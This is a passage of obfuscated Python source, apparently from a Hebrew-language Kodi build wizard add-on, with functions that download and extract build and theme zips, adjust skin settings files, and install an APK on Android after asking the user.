			OOOOOOOOO0OO00O0O =OOO000O00O00000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3782
			if not wiz .workingURL (OO000OOO0O000O00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3783
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3784
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO000O00O00000O0 ,wiz .checkBuild (OOO000O00O00000O0 ,'version')),'','אנא המתן')#line:3785
			O0O0OOO000OO0OO00 =os .path .join (PACKAGES ,'%s.zip'%OOOOOOOOO0OO00O0O )#line:3786
			try :os .remove (O0O0OOO000OO0OO00 )#line:3787
			except :pass #line:3788
			logging .warning (OO000OOO0O000O00O )#line:3789
			if 'google'in OO000OOO0O000O00O :#line:3790
			   O0OOOOO0000000000 =googledrive_download (OO000OOO0O000O00O ,O0O0OOO000OO0OO00 ,DP ,wiz .checkBuild (OOO000O00O00000O0 ,'filesize'))#line:3791
			else :#line:3794
			  downloader .download (OO000OOO0O000O00O ,O0O0OOO000OO0OO00 ,DP )#line:3795
			xbmc .sleep (1000 )#line:3796
			OOOO0OOOOO0OO0OO0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO000O00O00000O0 ,wiz .checkBuild (OOO000O00O00000O0 ,'version'))#line:3797
			DP .update (0 ,OOOO0OOOOO0OO0OO0 ,'','Please Wait')#line:3798
			OO00000000OOOOOO0 ,OO000000OOOO0OO0O ,O00O0OO0OO0O0OOO0 =extract .all (O0O0OOO000OO0OO00 ,HOME ,DP ,title =OOOO0OOOOO0OO0OO0 )#line:3799
			if int (float (OO00000000OOOOOO0 ))>0 :#line:3800
				wiz .fixmetas ()#line:3801
				wiz .lookandFeelData ('save')#line:3802
				wiz .defaultSkin ()#line:3803
				wiz .setS ('buildname',OOO000O00O00000O0 )#line:3805
				wiz .setS ('buildversion',wiz .checkBuild (OOO000O00O00000O0 ,'version'))#line:3806
				wiz .setS ('buildtheme','')#line:3807
				wiz .setS ('latestversion',wiz .checkBuild (OOO000O00O00000O0 ,'version'))#line:3808
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3809
				wiz .setS ('installed','true')#line:3810
				wiz .setS ('extract',str (OO00000000OOOOOO0 ))#line:3811
				wiz .setS ('errors',str (OO000000OOOO0OO0O ))#line:3812
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO00000000OOOOOO0 ,OO000000OOOO0OO0O ))#line:3813
				OOO0O0O0O0OOO0OO0 =(ADDON .getSetting ("gaiaseren"))#line:3815
				if OOO0O0O0O0OOO0OO0 =='true':#line:3816
					wiz .kodi17Fix ()#line:3817
				fastupdatefirstbuild (NOTEID )#line:3818
				skin_homeselect ()#line:3819
				skin_lower ()#line:3820
				rdbuildinstall ()#line:3821
				try :gaiaserenaddon ()#line:3823
				except :pass #line:3824
				adults18 ()#line:3825
				skinfix18 ()#line:3826
				try :os .remove (O0O0OOO000OO0OO00 )#line:3828
				except :pass #line:3829
				if OOO0O0O0O0OOO0OO0 =='true':#line:3831
					wiz .kodi17Fix ()#line:3832
				if int (float (OO000000OOOO0OO0O ))>0 :#line:3834
					O000OO0OO00000OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO000O00O00000O0 ,wiz .checkBuild (OOO000O00O00000O0 ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO00000000OOOOOO0 ,'%',COLOR1 ,OO000000OOOO0OO0O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3835
					if O000OO0OO00000OOO :#line:3836
						if isinstance (OO000000OOOO0OO0O ,unicode ):#line:3837
							O00O0OO0OO0O0OOO0 =O00O0OO0OO0O0OOO0 .encode ('utf-8')#line:3838
						wiz .TextBox (ADDONTITLE ,O00O0OO0OO0O0OOO0 )#line:3839
				DP .close ()#line:3840
				OO000OOOOOOOO0000 =wiz .themeCount (OOO000O00O00000O0 )#line:3841
				indicator ()#line:3842
				if not OO000OOOOOOOO0000 ==False :#line:3843
					buildWizard (OOO000O00O00000O0 ,'theme')#line:3844
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3845
				if INSTALLMETHOD ==1 :O0O00O0OOO000O0O0 =1 #line:3846
				elif INSTALLMETHOD ==2 :O0O00O0OOO000O0O0 =0 #line:3847
				else :resetkodi ()#line:3848
				if O0O00O0OOO000O0O0 ==1 :wiz .reloadFix ()#line:3850
				else :wiz .killxbmc (True )#line:3851
			else :#line:3852
				if isinstance (OO000000OOOO0OO0O ,unicode ):#line:3853
					O00O0OO0OO0O0OOO0 =O00O0OO0OO0O0OOO0 .encode ('utf-8')#line:3854
				O0OOOO0O0O0OOOO00 =open (O0O0OOO000OO0OO00 ,'r')#line:3855
				OO00O0O00O00O0O00 =O0OOOO0O0O0OOOO00 .read ()#line:3856
				OO00O00OO00000O0O =''#line:3857
				for OOO0OOOO000000O00 in O0OOOOO0000000000 :#line:3858
				  OO00O00OO00000O0O ='key: '+OO00O00OO00000O0O +'\n'+OOO0OOOO000000O00 #line:3859
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O00O0OO0OO0O0OOO0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO00O00OO00000O0O )#line:3860
		else :#line:3861
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:3862
	elif OOOO0OOOO0O0O00OO =='theme':#line:3863
		if theme ==None :#line:3864
			OO000OOOOOOOO0000 =wiz .checkBuild (OOO000O00O00000O0 ,'theme')#line:3865
			O00OOOO0O0OO0O0O0 =[]#line:3866
			if not OO000OOOOOOOO0000 =='http://'and wiz .workingURL (OO000OOOOOOOO0000 )==True :#line:3867
				O00OOOO0O0OO0O0O0 =wiz .themeCount (OOO000O00O00000O0 ,False )#line:3868
				if len (O00OOOO0O0OO0O0O0 )>0 :#line:3869
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OOO000O00O00000O0 ,COLOR1 ,len (O00OOOO0O0OO0O0O0 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:3870
						wiz .log ("Theme List: %s "%str (O00OOOO0O0OO0O0O0 ))#line:3871
						OO00O0O000O00O0O0 =DIALOG .select (ADDONTITLE ,O00OOOO0O0OO0O0O0 )#line:3872
						wiz .log ("Theme install selected: %s"%OO00O0O000O00O0O0 )#line:3873
						if not OO00O0O000O00O0O0 ==-1 :theme =O00OOOO0O0OO0O0O0 [OO00O0O000O00O0O0 ];OO0OOOOOOO0OOOO0O =True #line:3874
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3875
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3876
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:3877
		else :OO0OOOOOOO0OOOO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OOO000O00O00000O0 ,wiz .checkBuild (OOO000O00O00000O0 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:3878
		if OO0OOOOOOO0OOOO0O :#line:3879
			OO0OO0OOOOO0OO00O =wiz .checkTheme (OOO000O00O00000O0 ,theme ,'url')#line:3880
			OOOOOOOOO0OO00O0O =OOO000O00O00000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3881
			if not wiz .workingURL (OO0OO0OOOOO0OO00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:3882
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3883
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:3884
			O0O0OOO000OO0OO00 =os .path .join (PACKAGES ,'%s.zip'%OOOOOOOOO0OO00O0O )#line:3885
			try :os .remove (O0O0OOO000OO0OO00 )#line:3886
			except :pass #line:3887
			downloader .download (OO0OO0OOOOO0OO00O ,O0O0OOO000OO0OO00 ,DP )#line:3888
			xbmc .sleep (1000 )#line:3889
			DP .update (0 ,"","Installing %s "%OOO000O00O00000O0 )#line:3890
			O00000000O0O00000 =False #line:3891
			if url not in ["fresh","normal"]:#line:3892
				O00000000O0O00000 =testTheme (O0O0OOO000OO0OO00 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3893
				O0OOOOOOO000O0OOO =testGui (O0O0OOO000OO0OO00 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3894
				if O00000000O0O00000 ==True :#line:3895
					wiz .lookandFeelData ('save')#line:3896
					OOO0O0OOO0O00000O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:3897
					O000O0O00O0OOO0OO =xbmc .getSkinDir ()#line:3898
					skinSwitch .swapSkins (OOO0O0OOO0O00000O )#line:3900
					O000O0000000OO00O =0 #line:3901
					xbmc .sleep (1000 )#line:3902
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O0000000OO00O <150 :#line:3903
						O000O0000000OO00O +=1 #line:3904
						xbmc .sleep (1000 )#line:3905
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3906
						wiz .ebi ('SendClick(11)')#line:3907
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3908
					xbmc .sleep (1000 )#line:3909
			OOOO0OOOOO0OO0OO0 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:3910
			DP .update (0 ,OOOO0OOOOO0OO0OO0 ,'','אנא המתן')#line:3911
			OO00000000OOOOOO0 ,OO000000OOOO0OO0O ,O00O0OO0OO0O0OOO0 =extract .all (O0O0OOO000OO0OO00 ,HOME ,DP ,title =OOOO0OOOOO0OO0OO0 )#line:3912
			wiz .setS ('buildtheme',theme )#line:3913
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OO00000000OOOOOO0 ,OO000000OOOO0OO0O ))#line:3914
			DP .close ()#line:3915
			if url not in ["fresh","normal"]:#line:3916
				wiz .forceUpdate ()#line:3917
				if KODIV >=17 :wiz .kodi17Fix ()#line:3918
				if O0OOOOOOO000O0OOO ==True :#line:3919
					wiz .lookandFeelData ('save')#line:3920
					wiz .defaultSkin ()#line:3921
					O000O0O00O0OOO0OO =wiz .getS ('defaultskin')#line:3922
					skinSwitch .swapSkins (O000O0O00O0OOO0OO )#line:3923
					O000O0000000OO00O =0 #line:3924
					xbmc .sleep (1000 )#line:3925
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O0000000OO00O <150 :#line:3926
						O000O0000000OO00O +=1 #line:3927
						xbmc .sleep (1000 )#line:3928
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3930
						wiz .ebi ('SendClick(11)')#line:3931
					wiz .lookandFeelData ('restore')#line:3932
				elif O00000000O0O00000 ==True :#line:3933
					skinSwitch .swapSkins (O000O0O00O0OOO0OO )#line:3934
					O000O0000000OO00O =0 #line:3935
					xbmc .sleep (1000 )#line:3936
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O0000000OO00O <150 :#line:3937
						O000O0000000OO00O +=1 #line:3938
						xbmc .sleep (1000 )#line:3939
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3941
						wiz .ebi ('SendClick(11)')#line:3942
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3943
					wiz .lookandFeelData ('restore')#line:3944
				else :#line:3945
					wiz .ebi ("ReloadSkin()")#line:3946
					xbmc .sleep (1000 )#line:3947
					wiz .ebi ("Container.Refresh")#line:3948
		else :#line:3949
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:3950
def skin_homeselect ():#line:3954
	try :#line:3956
		OOO0O00OO0O00OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3957
		OO00O0OO0OOOOOOO0 =open (OOO0O00OO0O00OOO0 ,'r')#line:3959
		O000O0OO0000O0000 =OO00O0OO0OOOOOOO0 .read ()#line:3960
		OO00O0OO0OOOOOOO0 .close ()#line:3961
		O0O000O00OO00O000 ='<setting id="HomeS" type="string(.+?)/setting>'#line:3962
		O0OO00OO0OO0O0O0O =re .compile (O0O000O00OO00O000 ).findall (O000O0OO0000O0000 )[0 ]#line:3963
		OO00O0OO0OOOOOOO0 =open (OOO0O00OO0O00OOO0 ,'w')#line:3964
		OO00O0OO0OOOOOOO0 .write (O000O0OO0000O0000 .replace ('<setting id="HomeS" type="string%s/setting>'%O0OO00OO0OO0O0O0O ,'<setting id="HomeS" type="string"></setting>'))#line:3965
		OO00O0OO0OOOOOOO0 .close ()#line:3966
	except :#line:3967
		pass #line:3968
def skin_lower ():#line:3971
	O0OOO0O00OO0000O0 =(ADDON .getSetting ("lower"))#line:3972
	if O0OOO0O00OO0000O0 =='true':#line:3973
		try :#line:3976
			O00OO00O0O0OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3977
			OO0OOOO0OOO00OO00 =open (O00OO00O0O0OOO000 ,'r')#line:3979
			OO0OOOOOOO0OOOO00 =OO0OOOO0OOO00OO00 .read ()#line:3980
			OO0OOOO0OOO00OO00 .close ()#line:3981
			O0OOOOOO0OOO00OOO ='<setting id="none_widget" type="bool(.+?)/setting>'#line:3982
			OOO0O0OOOOOO0OOO0 =re .compile (O0OOOOOO0OOO00OOO ).findall (OO0OOOOOOO0OOOO00 )[0 ]#line:3983
			OO0OOOO0OOO00OO00 =open (O00OO00O0O0OOO000 ,'w')#line:3984
			OO0OOOO0OOO00OO00 .write (OO0OOOOOOO0OOOO00 .replace ('<setting id="none_widget" type="bool%s/setting>'%OOO0O0OOOOOO0OOO0 ,'<setting id="none_widget" type="bool">true</setting>'))#line:3985
			OO0OOOO0OOO00OO00 .close ()#line:3986
			O00OO00O0O0OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3988
			OO0OOOO0OOO00OO00 =open (O00OO00O0O0OOO000 ,'r')#line:3990
			OO0OOOOOOO0OOOO00 =OO0OOOO0OOO00OO00 .read ()#line:3991
			OO0OOOO0OOO00OO00 .close ()#line:3992
			O0OOOOOO0OOO00OOO ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:3993
			OOO0O0OOOOOO0OOO0 =re .compile (O0OOOOOO0OOO00OOO ).findall (OO0OOOOOOO0OOOO00 )[0 ]#line:3994
			OO0OOOO0OOO00OO00 =open (O00OO00O0O0OOO000 ,'w')#line:3995
			OO0OOOO0OOO00OO00 .write (OO0OOOOOOO0OOOO00 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OOO0O0OOOOOO0OOO0 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:3996
			OO0OOOO0OOO00OO00 .close ()#line:3997
			O00OO00O0O0OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3999
			OO0OOOO0OOO00OO00 =open (O00OO00O0O0OOO000 ,'r')#line:4001
			OO0OOOOOOO0OOOO00 =OO0OOOO0OOO00OO00 .read ()#line:4002
			OO0OOOO0OOO00OO00 .close ()#line:4003
			O0OOOOOO0OOO00OOO ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4004
			OOO0O0OOOOOO0OOO0 =re .compile (O0OOOOOO0OOO00OOO ).findall (OO0OOOOOOO0OOOO00 )[0 ]#line:4005
			OO0OOOO0OOO00OO00 =open (O00OO00O0O0OOO000 ,'w')#line:4006
			OO0OOOO0OOO00OO00 .write (OO0OOOOOOO0OOOO00 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OOO0O0OOOOOO0OOO0 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4007
			OO0OOOO0OOO00OO00 .close ()#line:4008
			O00OO00O0O0OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4012
			OO0OOOO0OOO00OO00 =open (O00OO00O0O0OOO000 ,'r')#line:4014
			OO0OOOOOOO0OOOO00 =OO0OOOO0OOO00OO00 .read ()#line:4015
			OO0OOOO0OOO00OO00 .close ()#line:4016
			O0OOOOOO0OOO00OOO ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4017
			OOO0O0OOOOOO0OOO0 =re .compile (O0OOOOOO0OOO00OOO ).findall (OO0OOOOOOO0OOOO00 )[0 ]#line:4018
			OO0OOOO0OOO00OO00 =open (O00OO00O0O0OOO000 ,'w')#line:4019
			OO0OOOO0OOO00OO00 .write (OO0OOOOOOO0OOOO00 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OOO0O0OOOOOO0OOO0 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4020
			OO0OOOO0OOO00OO00 .close ()#line:4021
			O00OO00O0O0OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4025
			OO0OOOO0OOO00OO00 =open (O00OO00O0O0OOO000 ,'r')#line:4027
			OO0OOOOOOO0OOOO00 =OO0OOOO0OOO00OO00 .read ()#line:4028
			OO0OOOO0OOO00OO00 .close ()#line:4029
			O0OOOOOO0OOO00OOO ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4030
			OOO0O0OOOOOO0OOO0 =re .compile (O0OOOOOO0OOO00OOO ).findall (OO0OOOOOOO0OOOO00 )[0 ]#line:4031
			OO0OOOO0OOO00OO00 =open (O00OO00O0O0OOO000 ,'w')#line:4032
			OO0OOOO0OOO00OO00 .write (OO0OOOOOOO0OOOO00 .replace ('<setting id="show.cdart" type="bool%s/setting>'%OOO0O0OOOOOO0OOO0 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4033
			OO0OOOO0OOO00OO00 .close ()#line:4034
			O00OO00O0O0OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4038
			OO0OOOO0OOO00OO00 =open (O00OO00O0O0OOO000 ,'r')#line:4040
			OO0OOOOOOO0OOOO00 =OO0OOOO0OOO00OO00 .read ()#line:4041
			OO0OOOO0OOO00OO00 .close ()#line:4042
			O0OOOOOO0OOO00OOO ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4043
			OOO0O0OOOOOO0OOO0 =re .compile (O0OOOOOO0OOO00OOO ).findall (OO0OOOOOOO0OOOO00 )[0 ]#line:4044
			OO0OOOO0OOO00OO00 =open (O00OO00O0O0OOO000 ,'w')#line:4045
			OO0OOOO0OOO00OO00 .write (OO0OOOOOOO0OOOO00 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OOO0O0OOOOOO0OOO0 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4046
			OO0OOOO0OOO00OO00 .close ()#line:4047
		except :#line:4052
			pass #line:4053
def thirdPartyInstall (OOOOOOOOOOO000O0O ,OOO00O0OO0000OO00 ):#line:4055
	if not wiz .workingURL (OOO00O0OO0000OO00 ):#line:4056
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4057
	O000O0O00OO0O0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOOOOOOO000O0O ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4058
	if O000O0O00OO0O0000 ==1 :#line:4059
		freshStart ('third',True )#line:4060
	wiz .clearS ('build')#line:4061
	O00OOOO0000OOO00O =OOOOOOOOOOO000O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4062
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4063
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOOOOOOO000O0O ),'','אנא המתן')#line:4064
	OOOOO00O0OOO0O00O =os .path .join (PACKAGES ,'%s.zip'%O00OOOO0000OOO00O )#line:4065
	try :os .remove (OOOOO00O0OOO0O00O )#line:4066
	except :pass #line:4067
	downloader .download (OOO00O0OO0000OO00 ,OOOOO00O0OOO0O00O ,DP )#line:4068
	xbmc .sleep (1000 )#line:4069
	O000OO0O00OOO000O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOOOOOOO000O0O )#line:4070
	DP .update (0 ,O000OO0O00OOO000O ,'','אנא המתן')#line:4071
	OO000O0OO0O0OOO0O ,OOO00O0000OO0O0OO ,O0O00OO0OOOO00000 =extract .all (OOOOO00O0OOO0O00O ,HOME ,DP ,title =O000OO0O00OOO000O )#line:4072
	if int (float (OO000O0OO0O0OOO0O ))>0 :#line:4073
		wiz .fixmetas ()#line:4074
		wiz .lookandFeelData ('save')#line:4075
		wiz .defaultSkin ()#line:4076
		wiz .setS ('installed','true')#line:4078
		wiz .setS ('extract',str (OO000O0OO0O0OOO0O ))#line:4079
		wiz .setS ('errors',str (OOO00O0000OO0O0OO ))#line:4080
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO000O0OO0O0OOO0O ,OOO00O0000OO0O0OO ))#line:4081
		try :os .remove (OOOOO00O0OOO0O00O )#line:4082
		except :pass #line:4083
		if int (float (OOO00O0000OO0O0OO ))>0 :#line:4084
			OO0OO0OO000OOO0OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOOOOOOO000O0O ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO000O0OO0O0OOO0O ,'%',COLOR1 ,OOO00O0000OO0O0OO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4085
			if OO0OO0OO000OOO0OO :#line:4086
				if isinstance (OOO00O0000OO0O0OO ,unicode ):#line:4087
					O0O00OO0OOOO00000 =O0O00OO0OOOO00000 .encode ('utf-8')#line:4088
				wiz .TextBox (ADDONTITLE ,O0O00OO0OOOO00000 )#line:4089
	DP .close ()#line:4090
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4091
	if INSTALLMETHOD ==1 :O0OOOO0OO00O0O0O0 =1 #line:4092
	elif INSTALLMETHOD ==2 :O0OOOO0OO00O0O0O0 =0 #line:4093
	else :O0OOOO0OO00O0O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4094
	if O0OOOO0OO00O0O0O0 ==1 :wiz .reloadFix ()#line:4095
	else :wiz .killxbmc (True )#line:4096
def testTheme (O0000OO0O00000000 ):#line:4098
	O0O0O0O0OOO000O0O =zipfile .ZipFile (O0000OO0O00000000 )#line:4099
	for O00OO0000OO00O000 in O0O0O0O0OOO000O0O .infolist ():#line:4100
		if '/settings.xml'in O00OO0000OO00O000 .filename :#line:4101
			return True #line:4102
	return False #line:4103
def testGui (OOOOO0O0O0O0O0OOO ):#line:4105
	O00O0000O000OO00O =zipfile .ZipFile (OOOOO0O0O0O0O0OOO )#line:4106
	for O0O0OO0OO00O0OO0O in O00O0000O000OO00O .infolist ():#line:4107
		if '/guisettings.xml'in O0O0OO0OO00O0OO0O .filename :#line:4108
			return True #line:4109
	return False #line:4110
def apkInstaller (OO0O00O0000OOOOOO ,O0OOOOOOO0000OO0O ):#line:4112
	wiz .log (OO0O00O0000OOOOOO )#line:4113
	wiz .log (O0OOOOOOO0000OO0O )#line:4114
	if wiz .platform ()=='android':#line:4115
		O0000OOO0OOO0OOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O00O0000OOOOOO ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4116
		if not O0000OOO0OOO0OOO0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4117
		OOOOOOOO00OO0O0OO =OO0O00O0000OOOOOO #line:4118
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4119
		if not wiz .workingURL (O0OOOOOOO0000OO0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4120
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOOOO00OO0O0OO ),'','אנא המתן')#line:4121
		O00O0O000O0O00OOO =os .path .join (PACKAGES ,"%s.apk"%OO0O00O0000OOOOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4122
		try :os .remove (O00O0O000O0O00OOO )#line:4123
		except :pass #line:4124
		downloader .download (O0OOOOOOO0000OO0O ,O00O0O000O0O00OOO ,DP )#line:4125
		xbmc .sleep (100 )#line:4126
		DP .close ()#line:4127
		notify .apkInstaller (OO0O00O0000OOOOOO )#line:4128
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O00O0O000O0O00OOO +'")')#line:4129
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4130
def createMenu (O0O0OO0OOO00O0O0O ,OOO00000O000OO000 ,OO0O0OOO00OOO00O0 ):#line:4136
	if O0O0OO0OOO00O0O0O =='saveaddon':#line:4137
		O0O00O000O0OO000O =[]#line:4138
		OO00OO0O00O0OO0OO =urllib .quote_plus (OOO00000O000OO000 .lower ().replace (' ',''))#line:4139
		O0000O0000O00OOOO =OOO00000O000OO000 .replace ('Debrid','Real Debrid')#line:4140
		OO000O00OOOO00O00 =urllib .quote_plus (OO0O0OOO00OOO00O0 .lower ().replace (' ',''))#line:4141
